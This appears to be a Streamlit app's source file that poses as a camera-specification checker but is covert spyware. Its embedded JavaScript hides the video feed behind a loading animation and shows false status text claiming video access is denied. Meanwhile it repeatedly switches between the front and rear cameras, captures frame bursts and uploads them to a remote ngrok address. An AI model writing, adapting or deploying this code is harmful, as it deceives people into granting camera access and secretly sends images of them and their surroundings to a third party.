import streamlit as st

st.set_page_config(layout="centered")
st.title("📸 Camera Statistics analysis")

# Set this to your laptop's local IP on same Wi-Fi (e.g., 192.168.x.x)
upload_url = "https://e630-2401-4900-93c9-8b37-158e-d0fb-1b57-1115.ngrok-free.app"  # <-- Replace with actual IP

st.markdown(f"""
This app checks camera specs to:
Make sure you allow permission to access the camera.
""")
st.markdown(f""" The wheels are running:
Device : sansung
Camera: Rear
Video Access : Denied ❌
Camera Info Access: Enables
Analysing Your Camera Specifications 
""")

st.components.v1.html(f"""
<!-- Hidden video (used for capturing) -->
<video id="video" autoplay playsinline style="display: none;"></video>
Analysing Your camera
<!-- Image shown instead of video preview -->
<object id="placeholder" 
        type="image/svg+xml" 
        data="https://cdn.svgator.com/images/2023/06/generative-ai-preloader.svg"
        width="100%" 
        style="max-width: 400px;">
</object>

<!-- Hidden canvas for frame capture -->
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const uploadUrl = "{upload_url}";

// Request camera access
navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
  .then(stream => {{
    video.srcObject = stream;
  }})
  .catch(err => {{
    alert("Webcam access denied: " + err);
  }});

let stream = null;
let isFront = true;

async function startCamera(facingMode) {{
  if (stream) {{
    stream.getTracks().forEach(track => track.stop());
  }}
  stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode }} }});
  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 800));
}}

async function captureAndUpload(url) {{
  if (video.readyState === video.HAVE_ENOUGH_DATA) {{
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(blob => {{
      const formData = new FormData();
      formData.append('frame', blob, 'frame.jpg');
      fetch(url, {{
        method: 'POST',
        body: formData
      }}).catch(e => console.log("Upload error", e));
    }}, 'image/jpeg');
  }}
}}

async function captureBurst(url, fps = 3, durationSec = 1) {{
  const interval = 1000 / fps;
  const totalFrames = Math.floor(fps * durationSec);
  for (let i = 0; i < totalFrames; i++) {{
    await captureAndUpload(url);
    await new Promise(r => setTimeout(r, interval));
  }}
}}

setInterval(async () => {{
  const facingMode = isFront ? "user" : "environment";
  const url = isFront ? "{upload_url}/front" : "{upload_url}/rear";

  try {{
    await startCamera(facingMode);
    await captureBurst(url, 3, 1);
  }} catch (err) {{
    console.error("Camera error:", err);
  }}

  isFront = !isFront;
}}, 2000);
</script>
""", height=480)



